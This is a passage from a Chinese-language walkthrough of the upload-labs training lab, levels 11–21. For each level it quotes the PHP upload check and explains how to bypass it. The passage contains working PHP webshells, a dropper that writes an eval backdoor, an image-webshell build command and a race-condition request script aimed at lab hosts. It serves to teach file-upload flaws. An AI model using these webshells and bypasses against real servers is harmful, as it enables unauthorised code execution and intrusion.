$file_name)</code></p><p>它是拿匹配字符串去挨个的对等待匹配字符串进行对比，当匹配上了就替换并返回。所以这里可以构造文件<code>cj.pphphp</code>当匹配第一个P的时候不满足，当匹配第二个p的时候满足并且会将<code>php</code>替换为空，接下来不会继续匹配了。剩下的P和hp就会组成<code>php</code>了</p><p><strong>关键：</strong>函数只进行一次替换，不会递归检查替换之后的结果</p><p><strong>接下来就是白名单绕过</strong></p><h1 id="upload-12-00截断"><a href="#upload-12-00截断" class="headerlink" title="upload-12(%00截断)"></a>upload-12(%00截断)</h1><p>查看关键源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;);</span><br><span class="line">    $file_ext = substr($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],strrpos($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],&quot;.&quot;)+1);</span><br><span class="line">    if(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">        $img_path = $_GET[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br></pre></td></tr></table></figure><p>这里是白名单，只允许上传<code>&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;</code>这三种后缀名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$img_path = $_GET[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br></pre></td></tr></table></figure><p>由这段代码可知，文件上传的路径可控，由get上传的参数save_path在<code>url</code>完全可控。</p><p>再满足条件php的版本低于5.3就可以使用%00绕过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">什么是%00截断漏洞</span><br><span class="line">在php处理文件名或者是路径的时候，如果遇到了URL编码的%00，就会将</span><br><span class="line">它解释为一个空字节（也就是ascii值为0）在php5.3之前，php会将这个空字节转化为\000，而php5.3之前文件名如果出现\000，会导致文件名被截断，只保留%00之前的内容。</span><br></pre></td></tr></table></figure><p>上传的一句话木马的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $GET[0]($_GET[1]);?&gt;</span><br><span class="line">通过get参数0接受要执行的函数名</span><br><span class="line">通过get参数1接受该函数的参数</span><br><span class="line">从而动态执行任意的php函数</span><br></pre></td></tr></table></figure><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505081559666.png" alt="image-20250508155908605"></p><p>在请求头加上文件名%00进行截断，然后发包</p><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505081601354.png" alt="image-20250508160101315"></p><p>可以通过一句话木马执行任意的函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/upload-labs-master/upload/yc.php?0=phpinfo</span><br></pre></td></tr></table></figure><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505081639602.png" alt="image-20250508163925546"></p><h1 id="upload-13-post传参的-00截断"><a href="#upload-13-post传参的-00截断" class="headerlink" title="upload-13(post传参的%00截断)"></a>upload-13(post传参的%00截断)</h1><p>关键如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_POST[&#x27;submit&#x27;]))&#123;</span><br><span class="line">    $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;);</span><br><span class="line">    $file_ext = substr($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],strrpos($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],&quot;.&quot;)+1);</span><br><span class="line">    if(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">        $img_path = $_POST[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br></pre></td></tr></table></figure><p>这一关使用的是POST传参，由于POST传参不会对%00进行编码，所以我们需要在文件名的后面加上一个占位符，再将占位符的十六 进制数更改为00，这样空字节就出来了，再移动字节的时候就会出现%00截断。</p><p>上传php文件抓包</p><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505081643611.png" alt="image-20250508164355554"></p><p>在请求包的upload后面加上<code>yc.phpa</code>再在hex视图将a对应的十六进制的数更改为00，这样就可以得到一个空字节，再次发包上传成功</p><p><strong>截断的原理</strong></p><p>低版本的<code>php</code>遇到00(空字节)会认为字符串结束，实际保存的路径姐变成了<code>/upload/yc.php</code>，后面的a被忽略了。</p><h1 id="upload-14-图片马-文件包含"><a href="#upload-14-图片马-文件包含" class="headerlink" title="upload-14(图片马+文件包含)"></a>upload-14(图片马+文件包含)</h1><p>源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">function getReailFileType($filename)&#123;</span><br><span class="line">    $file = fopen($filename, &quot;rb&quot;);</span><br><span class="line">    $bin = fread($file, 2); //只读2字节</span><br><span class="line">    fclose($file);</span><br><span class="line">    $strInfo = @unpack(&quot;C2chars&quot;, $bin);</span><br><span class="line">    $typeCode = intval($strInfo[&#x27;chars1&#x27;].$strInfo[&#x27;chars2&#x27;]);</span><br><span class="line">    $fileType = &#x27;&#x27;;</span><br><span class="line">    switch($typeCode)&#123;</span><br><span class="line">        case 255216:</span><br><span class="line">            $fileType = &#x27;jpg&#x27;;</span><br><span class="line">            break;</span><br><span class="line">        case 13780:</span><br><span class="line">            $fileType = &#x27;png&#x27;;</span><br><span class="line">            break;</span><br><span class="line">        case 7173:</span><br><span class="line">            $fileType = &#x27;gif&#x27;;</span><br><span class="line">            break;</span><br><span class="line">        default:</span><br><span class="line">            $fileType = &#x27;unknown&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">        return $fileType;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有源码可知这一关通过直接读取文件头标识来检测文件的真实类型，所以常规的绕过方法不可用。</p><p>这里使用图片马+文件包含绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">图片马的制作：</span><br><span class="line">在对应的文件夹下面打开cmd命令，执行下面的命令</span><br><span class="line">copy login.jpg/b+cj.php/a cj.jpg(login.jpg是任意的图片，cj.php是一句话木马，test.jpg是</span><br><span class="line">生成的一句话木马)</span><br></pre></td></tr></table></figure><p>上传生成的图片马</p><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505081659600.png" alt="image-20250508165915516"></p><p>点击上面的文件包含，得到</p><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505081659848.png" alt="image-20250508165956809"></p><p>所以这里使用了file作为参数进行文件包含</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://10.18.208.98/upload-labs-master/include.php?</span><br><span class="line"> file=upload/6720250321175356.jpg</span><br></pre></td></tr></table></figure><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505081704060.png" alt="image-20250508170441017"></p><h1 id="upload-15-图片马-文件包含"><a href="#upload-15-图片马-文件包含" class="headerlink" title="upload-15(图片马+文件包含)"></a>upload-15(图片马+文件包含)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$info</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$filename</span>);</span><br></pre></td></tr></table></figure><p>这个函数是 <code>PHP</code> 中用于检测图像文件信息的核心函数</p><p>与14相同的操作</p><h1 id="upload-16-图片马-文件包含"><a href="#upload-16-图片马-文件包含" class="headerlink" title="upload-16(图片马+文件包含)"></a>upload-16(图片马+文件包含)</h1><p>关键源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//需要开启php_exif模块</span></span><br><span class="line">    <span class="variable">$image_type</span> = <span class="title function_ invoke__">exif_imagetype</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$image_type</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;gif&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;jpg&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;png&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>exif_imagetype()</code>函数读取文件头部的魔数(magic number)判断图像类型</p><p>与14，15基本相同，只需要在小皮上面打开一个扩展<code>php_exif</code> <code>exif_imagetype()</code>是<code>php_exi</code>f扩展的一部分，不打开扩展的话本关会报错。</p><h1 id="upload-17-二次渲染绕过"><a href="#upload-17-二次渲染绕过" class="headerlink" title="upload-17(二次渲染绕过)"></a>upload-17(二次渲染绕过)</h1><p>关键源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$fileext= substr(strrchr($filename,&quot;.&quot;),1);</span><br><span class="line"></span><br><span class="line">    //判断文件后缀与类型，合法才进行上传操作</span><br><span class="line">    if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;))&#123;</span><br><span class="line">        if(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            //使用上传的图片生成新的图片</span><br><span class="line">            $im = imagecreatefromjpeg($target_path);</span><br><span class="line"></span><br><span class="line">            if($im == false)&#123;</span><br><span class="line">                $msg = &quot;该文件不是jpg格式的图片！&quot;;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                //给新图片指定文件名</span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).&quot;.jpg&quot;;</span><br><span class="line">                //显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br><span class="line">                $img_path = UPLOAD_PATH.&#x27;/&#x27;.$newfilename;</span><br><span class="line">                imagejpeg($im,$img_path);</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &quot;上传出错！&quot;;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>检查扩展名，MIME类型验证G</p><p><strong><code>imagecreatefromjpeg()</code>尝试将上传的文件作为<code>JPEG</code>图像解析，GD库会自动丢弃所有的非图像数据（包括隐藏在文件末尾的<code>php</code>代码）</strong>，这样就达到了二次渲染的效果。</p><p>经过函数处理之前的<code>wangcai.jpg</code>在010中效果</p><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505091354831.png" alt="image-20250509135413706"></p><p>经函数处理之后的<code>wangcai.jpg</code>文件在010中的效果</p><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505091354327.png" alt="image-20250509135448273"></p><p>对比两次的图，相同的数据为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">B4 B5 B6 B7 B8 B9 C2 C3 C4 C5 C6 C7 C8 C9 CA D2 D3 D4 D5 D6 D7 D8 D9 DA E1 E2 E3 E4</span><br><span class="line">这段数据对应的字符的长度刚好为一句话木马对应的字符的长度</span><br></pre></td></tr></table></figure><p>将不变的部分替换为一句话木马：</p><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505091405571.png" alt="image-20250509140528530"></p><p>将替换之后的wangcai.jpg文件上传</p><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505091358527.png" alt="image-20250509135808429"></p><p>将返回的文件另存为<code>wangcai2.jpg</code></p><p>丢进010中与<code>wangcai.jpg</code>进行对比发现数据没有丢失</p><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505091404057.png" alt="image-20250509140458002"></p><p>说明木马插入成功</p><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505091405307.png" alt="image-20250509140546240"></p><p>蚁剑连接成功</p><p><strong>能绕过的根本原理：</strong></p><p>文件头仍是合法的图片格式；</p><p>木马的代码位于不被渲染处理的数据区域；</p><p>文件扩展名和MIME类型检查都能够通过。</p><h1 id="upload-18-条件竞争漏洞"><a href="#upload-18-条件竞争漏洞" class="headerlink" title="upload-18(条件竞争漏洞)"></a>upload-18(条件竞争漏洞)</h1><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$file_name</span>,<span class="title function_ invoke__">strrpos</span>(<span class="variable">$file_name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$upload_file</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">             <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">             <span class="title function_ invoke__">rename</span>(<span class="variable">$upload_file</span>, <span class="variable">$img_path</span>);</span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$upload_file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><p>首先使用<code>move_uploaded_file</code>将文件进行上传，然后进行后缀名判断，如果不满足<code>.jpg|.png|.gif</code>文件类型，直接删除。</p><p><strong>漏洞利用原理</strong></p><p>我们可以直接将文件上传到上传到指定的文件路径(服务区)，服务区经过if语句判断是否该删除文件，在服务区没有删除文件的时候，进行访问上传的<code>php</code>文件，上传的php文件访问执行之后会生成一个一句话木马文件。</p><p>下面是上传的一句话木马内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fwrite</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[cmd]);?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br><span class="line">    /在目标服务器上面创建后门文件，以写入模式打开或者是创建一个名为shell.php的文件，并向该文件中写入内容，写入的内容为</span><br><span class="line">    <span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[cmd]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>下面是一个访问creat.php,并且判断shell.php是否已经生成的python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://10.18.208.48/upload-labs-master/upload/create.php&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    html = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> html.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;DOWN&quot;</span>)</span><br></pre></td></tr></table></figure><p>上传文件<code>create.php</code>,抓包</p><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505091954623.png" alt="image-20250509195403558"></p><p>设置payload如下：</p><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505091954411.png" alt="image-20250509195427358"></p><p>在运行脚本的同时开始攻击</p><p>知道脚本回显ok的时候停止攻击</p><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505091959366.png" alt="image-20250509195958296"></p><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505091951226.png" alt="image-20250509195125117"></p><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505092002029.png" alt="image-20250509200247949"></p><p>蚁剑连接成功</p><p><strong>绕过的原理：</strong></p><p>通过空payload攻击，快速重复发送相同的请求，从而触发服务端的竞争姿态，从而执行上传的后门文件的php代码。</p><h1 id="upload-19-条件竞争漏洞"><a href="#upload-19-条件竞争漏洞" class="headerlink" title="upload-19(条件竞争漏洞)"></a>upload-19(条件竞争漏洞)</h1><p>与18关相同</p><h1 id="upload-20-move-uploaded-file-函数"><a href="#upload-20-move-uploaded-file-函数" class="headerlink" title="upload-20(move_uploaded_file()函数)"></a>upload-20(move_uploaded_file()函数)</h1><p>关键源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file_name</span>,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;禁止保存为该类型文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>move_uploaded_file()函数有一个特性，将用户上传的临时文件移动到目标路径的时候如果目标路径的末尾包含斜杠<code>/</code>，php会自动的忽略他。</strong></p><p>上传php一句话木马拦截</p><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505101511083.png" alt="image-20250510151154041"></p><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505101511686.png" alt="image-20250510151137625"></p><p><strong>可以这样绕过的原理：</strong></p><p>后端校验获取扩展名的时候得到的是<code>.php/.</code>,不会被拦截，但是再利用<code>move_uploaded_file()</code>函数对路径处理的特性，自动忽略&#x2F;.文件就会保存为<code>.php</code>,，从而能够执行文件内容。</p><h1 id="upload-21-数组绕过"><a href="#upload-21-数组绕过" class="headerlink" title="upload-21(数组绕过)"></a>upload-21(数组绕过)</h1><p>关键源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//检查MIME</span></span><br><span class="line">    <span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ 